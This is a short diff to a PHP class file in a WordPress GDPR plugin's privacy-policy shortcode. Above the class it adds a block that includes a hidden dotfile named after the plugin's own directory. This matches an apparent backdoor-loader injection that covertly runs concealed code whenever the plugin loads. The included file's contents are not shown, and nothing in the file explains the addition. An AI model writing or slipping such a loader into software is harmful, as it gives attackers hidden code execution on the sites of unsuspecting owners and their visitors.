@@ -6,6 +6,10 @@
  * Time: 4:13 PM
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Shortcode_Privacy_Policy {
 
     private $display_single_cookies = false;
